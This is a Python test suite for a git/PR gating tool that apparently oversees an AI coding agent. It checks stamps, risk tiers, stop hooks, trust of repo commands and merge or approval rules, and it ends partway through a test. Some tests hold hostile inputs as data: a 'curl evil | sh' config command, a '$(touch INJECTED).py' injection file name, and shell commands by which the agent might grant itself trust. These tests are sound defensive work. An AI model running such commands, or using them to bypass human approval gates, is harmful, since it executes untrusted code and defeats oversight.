"""Checks for bin/land-it against throwaway git repos: `python3 -m unittest discover tests`."""
import importlib.machinery
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import unittest

BIN = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "bin", "land-it")
_loader = importlib.machinery.SourceFileLoader("land_it", BIN)
LI = importlib.util.module_from_spec(importlib.util.spec_from_loader("land_it", _loader))
_loader.exec_module(LI)


def sh(cwd, *cmd):
    return subprocess.run(cmd, cwd=cwd, check=True, capture_output=True, text=True).stdout


class Repo:
    def __init__(self, tc, cfg, trust=True):
        self._tmp, self._home = tempfile.TemporaryDirectory(), tempfile.TemporaryDirectory()
        tc.addCleanup(self._tmp.cleanup)
        tc.addCleanup(self._home.cleanup)
        self.root = os.path.realpath(self._tmp.name)
        sh(self.root, "git", "init", "-q", "-b", "main")
        sh(self.root, "git", "config", "user.email", "t@example.com")
        sh(self.root, "git", "config", "user.name", "t")
        if cfg is not None:
            self.write(".claude/land-it.json", json.dumps(cfg))
        self.write("a.py", "x = 1\n")
        self.commit("init")
        if cfg is not None and trust:
            self.trust()

    def trust(self):
        return self.hook("expand", command_name="land-it:trust")

    def review(self, *kinds):
        """What preflight records after its reviews ran: a round with completed stages."""
        self.cli("round")
        for kind in kinds or ("code", "security", "verify"):
            self.cli("stage", kind, "--status", "completed")

    def write(self, rel, text):
        path = os.path.join(self.root, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write(text)
        return path

    def commit(self, msg):
        sh(self.root, "git", "add", "-A")
        sh(self.root, "git", "commit", "-qm", msg)

    def cli(self, *args, stdin="", env=None):
        full = dict(os.environ, LAND_IT_HOME=self._home.name, CLAUDE_PLUGIN_ROOT=os.path.dirname(os.path.dirname(BIN)))
        full.update(env or {})
        env = full
        return subprocess.run([sys.executable, BIN, *args], cwd=self.root, input=stdin, capture_output=True, text=True,
                              env=env)

    def hook(self, event, runtime=None, **data):
        data.setdefault("cwd", self.root)
        data.setdefault("session_id", "s1")
        r = self.cli("hook", event, *(["--runtime", runtime] if runtime else []), stdin=json.dumps(data))
        assert r.returncode == 0, r.stderr
        return json.loads(r.stdout) if r.stdout.strip() else None

    def edit(self, rel, text, session="s1"):
        path = self.write(rel, text)
        return self.hook("post-edit", session_id=session, tool_input={"file_path": path})

    def pr_create(self):
        out = self.hook("pre-bash", tool_input={"command": "git push -u origin HEAD && gh pr create --fill"})
        return out and out["hookSpecificOutput"]["permissionDecision"]


class Glob(unittest.TestCase):
    def test_semantics(self):
        yes = [("*.md", "README.md"), ("*.md", "docs/a.md"), ("docs/**", "docs/x/y.txt"),
               (".github/workflows/**", ".github/workflows/ci.yml"), ("src/*.py", "src/a.py"),
               ("*.{ts,tsx}", "web/b.tsx"), ("src/billing", "src/billing/pay.py"), ("src/billing/", "src/billing/x")]
        no = [("src/*.py", "src/x/a.py"), ("*.{ts,tsx}", "b.js"), ("docs/**", "src/docs.py"), ("a.py", "a.pyc")]
        for pat, path in yes:
            self.assertTrue(LI.matches(pat, path), (pat, path))
        for pat, path in no:
            self.assertFalse(LI.matches(pat, path), (pat, path))


class Gate(unittest.TestCase):
    def test_same_size_edit_right_after_commit_changes_tree(self):
        # regression: a copied index with a fresh mtime hid racy entries from git,
        # so an edit in the commit's second looked unchanged once the clock ticked over
        r = Repo(self, {})
        r.write("a.py", "x = 2\n")
        time.sleep(1.1)
        self.assertNotEqual(LI.worktree_tree(r.root), LI.head_tree(r.root))

    def test_pr_create_needs_stamp_on_head_tree(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        self.assertEqual(r.pr_create(), "deny")
        self.assertEqual(r.cli("check").returncode, 0)
        r.review()
        self.assertEqual(r.cli("stamp").returncode, 0, "clean tree = HEAD tree")
        self.assertIsNone(r.pr_create())
        r.write("a.py", "x = 2\n")
        r.commit("change after stamp")
        self.assertEqual(r.pr_create(), "deny", "a stamp covers one tree only")

    def test_stamp_requires_green_tree(self):
        r = Repo(self, {"checks": {"bad": "false"}})
        self.assertEqual(r.cli("check").returncode, 1)
        self.assertNotEqual(r.cli("stamp").returncode, 0)

    def test_uncommitted_stamp_becomes_valid_once_committed(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        r.write("b.py", "y = 1\n")
        r.cli("check")
        r.review()
        self.assertEqual(r.cli("stamp").returncode, 0)
        self.assertEqual(r.pr_create(), "deny", "stamped content isn't committed yet")
        r.commit("commit the stamped tree")
        self.assertIsNone(r.pr_create())

    def test_silent_without_config(self):
        r = Repo(self, None)
        self.assertIsNone(r.pr_create())
        self.assertIsNone(r.hook("stop"))


class StopHook(unittest.TestCase):
    def test_blocks_red_lets_go_on_green(self):
        r = Repo(self, {"checks": {"t": "test -f ok"}})
        self.assertIsNone(r.hook("stop"), "no edits this session: nothing to prove")
        self.assertIsNone(r.edit("a.py", "x = 3\n"))
        out = r.hook("stop")
        self.assertEqual(out["decision"], "block")
        self.assertIn("== t: FAIL", out["reason"])
        self.assertIsNone(r.hook("stop", stop_hook_active=True), "same red tree: Claude may stop to ask")
        r.edit("ok", "")
        self.assertIn("green", r.hook("stop")["systemMessage"])
        self.assertIsNone(r.hook("stop"), "dirty mark cleared")
        self.assertIsNone(r.hook("stop", session_id="other"), "other sessions untouched")

    def test_gives_up_after_cap(self):
        r = Repo(self, {"checks": {"t": "false"}})
        for i in range(LI.MAX_STOP_BLOCKS):
            r.edit("a.py", "x = %d\n" % i)
            self.assertEqual(r.hook("stop")["decision"], "block")
        r.edit("a.py", "x = -1\n")
        self.assertIn("over to you", r.hook("stop")["systemMessage"])

    def test_off_switch(self):
        r = Repo(self, {"checks": {"t": "false"}, "stop_gate": False})
        r.edit("a.py", "x = 9\n")
        self.assertIsNone(r.hook("stop"))


class OnEdit(unittest.TestCase):
    def test_failing_per_file_command_blocks(self):
        r = Repo(self, {"on_edit": {"*.py": "grep -q GOOD {file}"}})
        out = r.edit("a.py", "bad\n")
        self.assertEqual(out["decision"], "block")
        self.assertIn("a.py", out["reason"])
        self.assertIsNone(r.edit("a.py", "GOOD\n"))
        self.assertIsNone(r.edit("notes.txt", "bad\n"), "glob doesn't match")



def branch(r, name="feature"):
    sh(r.root, "git", "checkout", "-qb", name)


class Risk(unittest.TestCase):
    def test_tiers(self):
        cfg = {"risk": {"high": ["src/billing/**"], "low": ["src/gen/**", ".claude/land-it.json"]}}
        cases = {"README.md": "low", "docs/a/b.txt": "low", "src/a.py": "medium", "CLAUDE.md": "medium",
                 "src/billing/pay.py": "high", "src/gen/x.py": "low", ".github/workflows/ci.yml": "high",
                 ".claude/land-it.json": "high"}
        for path, tier in cases.items():
            self.assertEqual(LI.file_tier(path, cfg), tier, path)
        self.assertEqual(LI.classify([], cfg)[0], "low")
        self.assertEqual(LI.classify(["README.md", "src/a.py"], cfg)[0], "medium")

    def test_cli_counts_committed_uncommitted_and_untracked(self):
        r = Repo(self, {})
        branch(r)
        r.write("docs/guide.md", "hi\n")
        r.commit("docs")
        self.assertEqual(json.loads(r.cli("risk").stdout)["tier"], "low")
        r.write("src/new.py", "x = 1\n")
        out = json.loads(r.cli("risk").stdout)
        self.assertEqual(out["tier"], "medium")
        self.assertEqual(set(out["files"]), {"docs/guide.md", "src/new.py"})


    def test_review_effort_defaults_and_override(self):
        r = Repo(self, {"review_effort": {"high": "max"}})
        out = json.loads(r.cli("risk").stdout)["review_effort"]
        self.assertEqual(out, {"low": "low", "medium": "medium", "high": "max"})

class Rounds(unittest.TestCase):
    def test_diff_only_after_first_round_and_cap(self):
        r = Repo(self, {"max_rounds": 2})
        branch(r)
        first = json.loads(r.cli("round").stdout)
        self.assertEqual((first["round"], first["target"], first["over_cap"]), (1, "", False))
        self.assertFalse(json.loads(r.cli("round").stdout)["reviewed"], "a started round isn't a finished review")
        r.cli("stage", "code", "--status", "completed")
        self.assertTrue(json.loads(r.cli("round").stdout)["reviewed"], "same tree, review recorded")
        r.write("a.py", "x = 'fixed'\n")
        second = json.loads(r.cli("round").stdout)
        self.assertEqual(second["round"], 2)
        start, end = second["target"].split("..")
        self.assertEqual(sh(r.root, "git", "diff", "--name-only", start, end).split(), ["a.py"])
        r.write("a.py", "x = 'again'\n")
        self.assertTrue(json.loads(r.cli("round").stdout)["over_cap"])
        r.cli("round", "--reset")
        self.assertEqual(json.loads(r.cli("round").stdout)["round"], 1)


class Findings(unittest.TestCase):
    def test_pre_existing_dedupe_and_every_finding_answered(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        branch(r)
        r.write("a.py", "x = 1\ny = 2\n")
        r.commit("add y")
        found = [{"file": "a.py", "line": 1, "summary": "x is wrong"},
                 {"file": os.path.join(r.root, "a.py"), "line": "2", "summary": "y is wrong"}]
        added = json.loads(r.cli("findings", "add", stdin=json.dumps(found)).stdout)
        self.assertEqual([(f["id"], f["status"], f["introduced"]) for f in added],
                         [("F1", "open", "before"), ("F2", "open", "this-change")], "blame hints, never decides")
        again = json.loads(r.cli("findings", "add", stdin=json.dumps(found[1:])).stdout)
        self.assertEqual(again, [], "a finding is never posted twice")
        r.cli("check")
        r.review()
        refused = r.cli("stamp")
        self.assertNotEqual(refused.returncode, 0)
        self.assertIn("F1, F2", refused.stderr)
        for status in ("wontfix", "pre-existing"):
            self.assertNotEqual(r.cli("findings", "resolve", "F2", "--status", status).returncode, 0, "needs a reason")
        r.cli("findings", "resolve", "F1", "--status", "pre-existing", "--reason", "same failure on main")
        self.assertEqual(r.cli("findings", "resolve", "F2", "--status", "wontfix", "--reason", "intended").returncode, 0)
        self.assertEqual(r.cli("stamp").returncode, 0)

    def test_stamp_tier_can_rise_never_drop(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        branch(r)
        r.write(".github/workflows/ci.yml", "on: push\n")
        r.cli("check")
        r.review()
        self.assertNotEqual(r.cli("stamp", "--tier", "low").returncode, 0)
        self.assertEqual(json.loads(r.cli("stamp", "--tier", "high").stdout)["tier"], "high")


class MergeGate(unittest.TestCase):
    def merge(self, r, cmd):
        out = r.hook("pre-bash", tool_input={"command": cmd})
        return out and out["hookSpecificOutput"]["permissionDecision"]

    def test_only_low_stamped_head_merges_without_a_human(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        branch(r)
        r.write("docs/a.md", "x\n")
        r.commit("docs")
        r.cli("check")
        r.review()
        r.cli("stamp")
        self.assertIsNone(self.merge(r, "gh pr merge --squash --delete-branch"))
        self.assertEqual(self.merge(r, "gh pr merge 12 --squash"), "ask", "another PR: can't vouch for it")
        r.write("src/a.py", "x\n")
        r.commit("code")
        r.cli("check")
        r.review()
        r.cli("stamp")
        self.assertEqual(self.merge(r, "gh pr merge --squash"), "ask", "medium needs a person")

    def test_agent_never_approves(self):
        r = Repo(self, {})
        self.assertEqual(self.merge(r, "gh pr review 5 --approve -b lgtm"), "deny")
        self.assertIsNone(self.merge(r, "gh pr review 5 --comment -b 'see line 3'"))
        self.assertIsNone(self.merge(r, "git status"))


class StopLowTier(unittest.TestCase):
    def test_docs_only_turn_skips_checks(self):
        r = Repo(self, {"checks": {"t": "false"}})
        r.edit("README.md", "words\n")
        self.assertIsNone(r.hook("stop"))



class Evals(unittest.TestCase):
    def setUp(self):
        self.r = r = Repo(self, {})
        r.write("a.py", "x = 1\ny = None\nz = 3\n")
        r.commit("bug lands on line 2")
        self.bug = sh(r.root, "git", "rev-parse", "HEAD").strip()
        r.write("b.py", "ok = True\n")
        r.commit("clean change")
        self.clean = sh(r.root, "git", "rev-parse", "HEAD").strip()
        add = r.cli("eval", "add", "--commit", self.bug, "--file", "a.py", "--line", "2", "--summary", "y is None")
        self.assertEqual(add.returncode, 0, add.stderr)
        self.assertEqual(r.cli("eval", "add", "--commit", self.clean, "--clean", "--id", "clean1").returncode, 0)
        r.write("REVIEW.md", "RULE-X\n")  # today's rules, uncommitted: the eval must use them

    def stub(self, on_bug, on_clean="Nothing to fix."):
        # a fake reviewer that only "sees" when the copied REVIEW.md is present
        return ("grep -q RULE-X REVIEW.md || exit 3; case {range} in *%s) echo '%s';; *) echo '%s';; esac"
                % (self.bug, on_bug, on_clean))

    def run_eval(self, *args, code=0):
        out = self.r.cli("eval", "run", *args)
        self.assertEqual(out.returncode, code, out.stderr)
        return out.stdout

    def test_scores_and_verdicts(self):
        self.assertIn("baseline recorded", self.run_eval("--reviewer", self.stub("Important: a.py:2 y is None")))
        self.assertIn("no change", self.run_eval("--reviewer", self.stub("a.py:3 near the bug")))
        self.assertIn("more noise", self.run_eval("--reviewer", self.stub("a.py:2", "b.py:1 looks odd")))
        self.assertIn("worse", self.run_eval("--reviewer", self.stub("src/other.py:2")))
        with open(os.path.join(self.r.root, LI.EVAL_DIR, "history.jsonl")) as f:
            runs = [json.loads(ln) for ln in f]
        self.assertEqual([(x["recall"], x["noise"]) for x in runs], [(1.0, 0.0), (1.0, 0.0), (1.0, 1.0), (0.0, 0.0)])
        self.assertEqual(sh(self.r.root, "git", "worktree", "list").count("\n"), 1, "eval worktrees cleaned up")

    def test_only_is_not_recorded_and_errors_block_comparison(self):
        self.assertIn("not recorded", self.run_eval("--reviewer", self.stub("a.py:2"), "--only", "clean1"))
        self.assertFalse(os.path.exists(os.path.join(self.r.root, LI.EVAL_DIR, "history.jsonl")))
        self.assertIn("failed to run", self.run_eval("--reviewer", "exit 1", code=2))

    def test_judge_scores_the_defect_not_the_citation(self):
        reviewer = self.stub("the y default is wrong (no file:line given)")
        judge = ("grep -q 'known-good' && echo '{\"caught\": 0, \"findings\": 2}' "
                 "|| echo 'verdict: {\"caught\": 1, \"findings\": 1}'")
        out = self.run_eval("--reviewer", reviewer, "--judge-cmd", judge)
        self.assertIn('"recall": 1.0', out)
        self.assertIn('"noise": 2.0', out)
        self.assertIn("scorer changed", self.run_eval("--reviewer", reviewer))
        self.assertIn("failed to run", self.run_eval("--reviewer", reviewer, "--judge-cmd", "echo no json", code=2))
        for bad in ("echo '{\"caught\": 1, \"findings\": 1}'; exit 3", "echo '{\"caught\": -1, \"findings\": 0}'",
                    "echo '{\"caught\": 5, \"findings\": 5}'"):
            self.assertIn("failed to run", self.run_eval("--reviewer", reviewer, "--judge-cmd", bad, code=2), bad)

    def test_bug_case_needs_location(self):
        self.assertNotEqual(self.r.cli("eval", "add", "--commit", self.bug).returncode, 0)



class Trust(unittest.TestCase):
    def test_untrusted_commands_never_run(self):
        r = Repo(self, {"checks": {"t": "touch .git/RAN"}, "on_edit": {"*.py": "touch .git/RAN2"}}, trust=False)
        refused = r.cli("check")
        self.assertNotEqual(refused.returncode, 0)
        self.assertIn("/land-it:trust", refused.stderr)
        self.assertIn("/land-it:trust", r.edit("a.py", "x = 2\n")["systemMessage"])
        self.assertIsNone(r.edit("a.py", "x = 3\n"), "warned once per session")
        self.assertIn("/land-it:trust", r.hook("stop")["systemMessage"])
        self.assertFalse(os.path.exists(os.path.join(r.root, ".git/RAN")) or os.path.exists(os.path.join(r.root, ".git/RAN2")))
        r.trust()
        self.assertEqual(r.cli("check").returncode, 0)
        self.assertTrue(os.path.exists(os.path.join(r.root, ".git/RAN")))

    def test_trust_follows_commands_not_other_keys(self):
        r = Repo(self, {"checks": {"t": "true"}})
        status = lambda: json.loads(r.cli("status").stdout)["commands_trusted"]
        self.assertTrue(status())
        r.write(".claude/land-it.json", json.dumps({"checks": {"t": "true"}, "risk": {"high": ["x/**"]}}))
        self.assertTrue(status(), "risk tweaks don't need re-trust")
        r.write(".claude/land-it.json", json.dumps({"checks": {"t": "curl evil | sh"}}))
        self.assertFalse(status(), "a changed command does")

    def test_only_a_user_typed_command_grants_trust(self):
        r = Repo(self, {"checks": {"t": "true"}}, trust=False)
        r.hook("expand", command_name="other:trust")
        self.assertNotEqual(r.cli("check").returncode, 0)
        self.assertNotEqual(r.cli("trust").returncode, 0, "no terminal: Claude's shell can't trust")
        for cmd in ("land-it trust", "python3 /p/bin/land-it trust", "echo y | land-it trust"):
            out = r.hook("pre-bash", tool_input={"command": cmd})
            self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny", cmd)


class Turns(unittest.TestCase):
    def test_snapshot_catches_edits_made_through_bash(self):
        r = Repo(self, {"checks": {"t": "test -f ok"}})
        r.hook("prompt")
        r.write("a.py", "x = 'sed -i did this'\n")  # no Edit/Write tool, so no post-edit hook
        self.assertEqual(r.hook("stop")["decision"], "block")

    def test_user_edits_between_turns_arent_claudes(self):
        r = Repo(self, {"checks": {"t": "false"}})
        r.write("a.py", "x = 'user typing'\n")
        r.hook("prompt")
        self.assertIsNone(r.hook("stop"))

    def test_path_scoped_checks(self):
        r = Repo(self, {"checks": {"web": {"run": "false", "paths": ["web/**"]}, "api": {"run": "true", "paths": ["api/**"]}}})
        branch(r)
        r.write("api/x.py", "ok\n")
        out = r.cli("check")
        self.assertEqual(out.returncode, 0, out.stdout)
        self.assertIn("web: skipped", out.stdout)
        r.hook("prompt")
        r.write("api/y.py", "ok\n")
        self.assertIn("green", r.hook("stop")["systemMessage"])
        r.write("web/app.js", "x\n")
        self.assertEqual(r.cli("check").returncode, 1)



class Measure(unittest.TestCase):
    def commits_on_main(self, r, n, reverts):
        for i in range(n):
            msg = 'Revert "change %d"' % i if i < reverts else "change %d" % i
            sh(r.root, "git", "commit", "-q", "--allow-empty", "-m", msg)

    def test_circuit_breaker_only_observes_by_default(self):
        r = Repo(self, {})
        self.commits_on_main(r, 20, reverts=2)
        branch(r)
        r.write("docs/a.md", "x\n")
        out = json.loads(r.cli("risk").stdout)
        self.assertTrue(out["circuit_breaker"]["tripped"])
        self.assertEqual((out["circuit_breaker"]["mode"], out["tier"]), ("observe", "low"))

    def test_circuit_breaker_raises_the_floor(self):
        r = Repo(self, {"checks": {"ok": "true"}, "circuit_breaker": {"mode": "enforce"}})
        self.commits_on_main(r, 20, reverts=2)  # 2 of 21 > 5%
        branch(r)
        r.write("docs/a.md", "x\n")
        out = json.loads(r.cli("risk").stdout)
        self.assertTrue(out["circuit_breaker"]["tripped"])
        self.assertEqual(out["tier"], "medium", "docs are low, the breaker lifts them one tier")
        r.cli("check")
        self.assertNotEqual(r.cli("stamp", "--tier", "low").returncode, 0)
        r.write(".claude/land-it.json", json.dumps({"checks": {"ok": "true"}, "circuit_breaker": False}))
        self.assertEqual(json.loads(r.cli("risk").stdout)["tier"], "high", "now the config itself changed")

    def test_breaker_needs_enough_history(self):
        r = Repo(self, {})
        self.commits_on_main(r, 3, reverts=2)
        self.assertFalse(json.loads(r.cli("risk").stdout)["circuit_breaker"]["tripped"])

    def test_stats_from_stamps(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        branch(r, "one")
        r.write("src/a.py", "a\n")
        r.cli("round")
        r.cli("findings", "add", stdin=json.dumps([{"file": "src/a.py", "line": 1, "summary": "bug"}]))
        r.cli("findings", "resolve", "F1", "--status", "fixed")
        r.cli("check")
        r.cli("stage", "code", "--status", "completed")
        r.cli("stage", "security", "--status", "completed")
        self.assertEqual(r.cli("stamp").returncode, 0)
        r.cli("stamp")  # a re-stamp of the same change counts once
        r.commit("one")
        branch(r, "two")
        r.write("src/b.py", "b\n")
        r.cli("round")
        r.write("src/b.py", "b2\n")
        r.cli("round")
        r.cli("stage", "code", "--status", "completed")
        r.cli("stage", "security", "--status", "completed")
        r.cli("check")
        r.cli("stamp")
        out = json.loads(r.cli("stats").stdout)
        self.assertEqual(out["preflight"]["changes"], 2)
        self.assertEqual(out["preflight"]["one_round_pct"], 50)
        self.assertEqual(out["preflight"]["mean_rounds"], 1.5)
        self.assertEqual((out["findings"]["total"], out["findings"]["fixed_pct"]), (1, 100))

    def test_github_human_time(self):
        r = Repo(self, {})
        bot, human = lambda login: {"__typename": "Bot", "login": login}, lambda login: {"__typename": "User", "login": login}
        prs = [{"title": "Add x", "createdAt": "2026-10-01T10:00:00Z", "mergedAt": "2026-10-01T12:00:00Z",
                "reviews": {"nodes": [{"author": human("alice"), "state": "APPROVED", "body": "", "comments": {"totalCount": 2}},
                                      {"author": bot("claude"), "state": "APPROVED", "body": "lgtm"}]},
                "comments": {"nodes": [{"author": human("bob")}, {"author": bot("claude")}]}},
               {"title": 'Revert "Add x"', "createdAt": "2026-10-02T00:00:00Z", "mergedAt": "2026-10-02T10:00:00Z",
                "reviews": {"nodes": [{"author": bot("claude"), "state": "APPROVED", "body": "ok", "comments": {"totalCount": 5}}]},
                "comments": {"nodes": []}}]
        fake = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, fake)
        with open(os.path.join(fake, "prs.json"), "w") as f:
            f.write("\n".join(json.dumps(pr) for pr in prs))  # what `gh api --jq '.nodes[]'` prints
        with open(os.path.join(fake, "gh"), "w") as f:
            f.write("#!/bin/sh\ncat '%s/prs.json'\n" % fake)
        os.chmod(os.path.join(fake, "gh"), 0o755)
        gh = json.loads(r.cli("stats", "--github", env={"PATH": fake + os.pathsep + os.environ["PATH"]}).stdout)["github"]
        self.assertEqual(gh["merged_prs"], 2)
        self.assertEqual(gh["merged_without_approval_pct"], 50, "the Claude app's approval doesn't count")
        self.assertEqual(gh["human_comments_per_pr"]["p95"], 3, "a person's inline review comments count, a bot's don't")
        self.assertEqual(gh["revert_prs_pct"], 50)
        self.assertEqual(gh["hours_to_merge"]["median"], 6.0, "an even sample's median is the mean of the middle two")



FAKE_GH = """#!/usr/bin/env python3
import json, os, sys
args = sys.argv[1:]
with open(os.environ["GH_LOG"], "a") as f:
    f.write(json.dumps(args) + "\\n")
if args[:2] == ["pr", "view"]:
    print(42)
elif any("reviewThreads" in a for a in args):
    bot, human = {"__typename": "Bot", "login": "claude"}, {"__typename": "User", "login": "alice"}
    for t in [{"id": "T1", "isResolved": False, "isOutdated": False, "path": "a.py", "line": 2,
               "comments": {"nodes": [{"author": bot, "body": "Important: y is None", "url": "u1"}]}},
              {"id": "T2", "isResolved": True, "path": "a.py", "line": 1, "comments": {"nodes": [{"author": human, "body": "ok"}]}},
              {"id": "T3", "isResolved": False, "isOutdated": True, "path": "b.py", "line": None, "originalLine": 5,
               "comments": {"nodes": [{"author": human, "body": "why?", "url": "u3"}, {"author": bot, "body": "because"}]}}]:
        print(json.dumps(t))
elif any("addPullRequestReviewThreadReply" in a for a in args):
    payload = None if os.environ.get("NULL_REPLY") else {"comment": {"url": "https://example/reply"}}
    print(json.dumps({"data": {"addPullRequestReviewThreadReply": payload}}))
elif os.environ.get("FAIL_RESOLVE"):
    sys.exit("GraphQL: Resource not accessible by integration")
else:
    print(json.dumps({"data": {"resolveReviewThread": {"thread": {"isResolved": True}}}}))
"""


class GitHubLoop(unittest.TestCase):
    def setUp(self):
        self.r = Repo(self, {})
        self.fake = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.fake)
        with open(os.path.join(self.fake, "gh"), "w") as f:
            f.write(FAKE_GH)
        os.chmod(os.path.join(self.fake, "gh"), 0o755)
        self.log = os.path.join(self.fake, "log")
        self.env = {"PATH": self.fake + os.pathsep + os.environ["PATH"], "GH_LOG": self.log}

    def calls(self):
        with open(self.log) as f:
            return [json.loads(ln) for ln in f]

    def test_lists_only_unresolved_threads_for_this_branch_pr(self):
        out = json.loads(self.r.cli("threads", env=self.env).stdout)
        self.assertEqual(out["pr"], 42)
        self.assertEqual([(t["id"], t["bot"], t["replies"], t["line"]) for t in out["unresolved"]],
                         [("T1", True, 0, 2), ("T3", False, 1, 5)], "an outdated thread keeps its original line")
        self.assertIn("pr=42", self.calls()[-1])
        for given in ("7", "#7", "https://github.com/o/r/pull/7"):
            self.assertEqual(json.loads(self.r.cli("threads", given, env=self.env).stdout)["pr"], 7, given)
        bad = self.r.cli("threads", "abc", env=self.env)
        self.assertNotEqual(bad.returncode, 0)
        self.assertNotIn("Traceback", bad.stderr)

    def test_reply_and_resolve(self):
        out = json.loads(self.r.cli("threads", "reply", "T1", "--body", "Fixed in abc123", "--resolve", env=self.env).stdout)
        self.assertEqual(out, {"replied": "https://example/reply", "resolved": True})
        reply, resolve = self.calls()
        self.assertIn("body=Fixed in abc123", reply)
        self.assertTrue(any("resolveReviewThread" in a for a in resolve) and "id=T1" in resolve)

    def test_failed_resolve_never_invites_a_second_reply(self):
        out = self.r.cli("threads", "reply", "T1", "--body", "Fixed", "--resolve", env=dict(self.env, FAIL_RESOLVE="1"))
        self.assertNotEqual(out.returncode, 0)
        self.assertIn("replied at https://example/reply", out.stderr)
        self.assertIn("land-it threads resolve T1", out.stderr)

    def test_null_reply_payload_is_a_clean_error(self):
        out = self.r.cli("threads", "reply", "T1", "--body", "x", env=dict(self.env, NULL_REPLY="1"))
        self.assertNotEqual(out.returncode, 0)
        self.assertNotIn("Traceback", out.stderr)

    def test_replying_always_asks_the_user(self):
        decision = lambda cmd: (self.r.hook("pre-bash", tool_input={"command": cmd}) or {}).get(
            "hookSpecificOutput", {}).get("permissionDecision")
        for cmd in ("land-it threads reply T1 --body 'intended'", "land-it threads --body hi reply T1",
                    "land-it threads --resolve reply T1 --body hi", "land-it threads resolve T1"):
            self.assertEqual(decision(cmd), "ask", cmd)
        self.assertIsNone(decision("land-it threads"))
        self.assertEqual(decision("land-it threads reply T1 --body ok && gh pr review 12 --approve"), "deny",
                         "an ask must not let a combined deny through")


class Sweep(unittest.TestCase):
    def test_rotates_over_high_risk_areas(self):
        r = Repo(self, {"risk": {"high": ["src/billing/**", "src/auth/**", "*.sql", "src/none/**"]}})
        for path in ("src/billing/a.py", "src/auth/b.py", "db/x.sql"):
            r.write(path, "x\n")
        r.commit("areas")
        picks = [json.loads(r.cli("sweep-target", "--day", str(d)).stdout)["target"] for d in (0, 1, 2, 3)]
        self.assertEqual(picks, ["db/x.sql", "src/auth", "src/billing", "db/x.sql"], "globs matching nothing are skipped")

    def test_slash_less_glob_points_at_where_its_matches_live(self):
        r = Repo(self, {"risk": {"high": ["billing"]}})
        for path in ("src/billing/a.py", "src/billing/b.py"):
            r.write(path, "x\n")
        r.commit("billing")
        self.assertEqual(json.loads(r.cli("sweep-target").stdout)["candidates"], ["src/billing"])

    def test_falls_back_to_top_level_dirs(self):
        r = Repo(self, {})
        for path in ("app/main.py", "docs/a.md", "tests/t.py", "lib/u.py"):
            r.write(path, "x\n")
        r.commit("dirs")
        out = json.loads(r.cli("sweep-target", "--day", "0").stdout)
        self.assertEqual((out["candidates"], out["from"]), (["app", "lib"], "top-level directories"))


class EvalScan(unittest.TestCase):
    def test_finds_reverts_not_yet_recorded(self):
        r = Repo(self, {})
        r.write("a.py", "x = 'bad'\n")
        r.commit("ship a bad change")
        bad = sh(r.root, "git", "rev-parse", "HEAD").strip()
        sh(r.root, "git", "revert", "--no-edit", "HEAD")
        found = json.loads(r.cli("eval", "scan").stdout)
        self.assertEqual([f["reverted"] for f in found], [bad])
        r.cli("eval", "add", "--commit", bad, "--file", "a.py", "--line", "1", "--summary", "bad value")
        self.assertEqual(json.loads(r.cli("eval", "scan").stdout), [])
        sh(r.root, "git", "revert", "--no-edit", "HEAD")  # reapply: reverting the revert isn't an incident
        self.assertEqual(json.loads(r.cli("eval", "scan").stdout), [])



class AuditRegressions(unittest.TestCase):
    """Reproductions from the 2026-10-24 audit (RECOMMENDATIONS.ru.md), one per finding fixed in 0.6.2."""

    def test_r13_claude_cant_trust_itself_through_the_hook_entry(self):
        r = Repo(self, {"checks": {"t": "touch PWNED"}}, trust=False)
        fake = json.dumps({"command_name": "land-it:trust", "cwd": r.root})
        out = r.cli("hook", "expand", stdin=fake, env={"CLAUDE_PLUGIN_ROOT": ""})
        self.assertNotEqual(out.returncode, 0, "a shell call isn't a hook")
        self.assertFalse(json.loads(r.cli("status").stdout)["commands_trusted"])
        for cmd in ("echo '%s' | land-it hook expand" % fake, "python3 ~/p/bin/land-it hook expand < f.json",
                    "echo {} > ~/.land-it/trust.json"):
            out = r.hook("pre-bash", tool_input={"command": cmd})
            self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny", cmd)

    def test_r14_a_file_name_never_runs_as_code(self):
        r = Repo(self, {"on_edit": {"*.py": 'printf "%s" "{file}" > /dev/null', "*.txt": "test -f {file}"}})
        r.edit("$(touch INJECTED).py", "x\n")
        self.assertFalse(os.path.exists(os.path.join(r.root, "INJECTED")))
        self.assertIsNone(r.edit("a b's.txt", "x\n"), "an unquoted {file} still gets the exact path")

    def old_commit_with_symlink(self, r, link, target):
        os.symlink(target, os.path.join(r.root, link))
        r.write("a.py", "x = 2\n")
        r.commit("old commit with %s as a symlink" % link)
        bad = sh(r.root, "git", "rev-parse", "HEAD").strip()
        os.remove(os.path.join(r.root, link))
        return bad

    def test_r10_eval_overlay_replaces_a_symlinked_file_without_following_it(self):
        r = Repo(self, {})
        outside = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, outside)
        sentinel = os.path.join(outside, "sentinel")
        with open(sentinel, "w") as f:
            f.write("untouched")
        bad = self.old_commit_with_symlink(r, "REVIEW.md", sentinel)
        r.write("REVIEW.md", "today's rules\n")
        r.commit("real REVIEW.md")
        r.cli("eval", "add", "--commit", bad, "--file", "a.py", "--line", "1", "--summary", "x")
        out = r.cli("eval", "run", "--reviewer", "grep -q \"today's rules\" REVIEW.md && echo a.py:1")
        self.assertIn("caught 1/1", out.stdout, "the reviewer saw today's rules")
        with open(sentinel) as f:
            self.assertEqual(f.read(), "untouched")

    def test_r10_eval_with_a_symlinked_directory_writes_nothing_outside(self):
        r = Repo(self, {})
        outside = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, outside)
        os.rename(os.path.join(r.root, ".claude"), os.path.join(r.root, ".claude-real"))
        bad = self.old_commit_with_symlink(r, ".claude", outside)
        os.rename(os.path.join(r.root, ".claude-real"), os.path.join(r.root, ".claude"))
        r.commit("real .claude")
